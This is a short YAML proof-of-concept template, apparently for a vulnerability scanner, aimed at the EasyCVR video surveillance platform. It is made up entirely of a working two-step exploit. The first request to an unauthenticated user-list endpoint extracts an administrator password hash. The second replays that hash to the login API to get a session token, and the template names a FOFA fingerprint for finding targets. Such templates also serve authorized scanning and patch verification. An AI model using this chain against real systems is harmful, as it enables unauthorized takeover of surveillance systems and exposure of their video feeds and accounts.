id: poc-yaml-easy-cvr-password-leak
info:
  name: 视频监控汇聚平台EasyCVR密码泄漏漏洞
  severity: high
  tags:
  - 信息泄露
  finger: EasyCVR
  FOFA: EasyCVR
requests:
- method: GET
  path: /api/v1/userlist?pageindex=0&pagesize=10
  expression: status_code == 200 && contains(body,"easycvr") && contains(body,"Administrator")
  output:
  - regex_match(body,"(?P<passwd>[a-z0-9]{32})")
- method: GET
  path: /api/v1/login?_t=1698724339&username=easycvr&password={{.passwd}}
  expression: status_code == 200 && contains(body,"Success OK") && contains(body,"Token")
variables: {}
transport: http
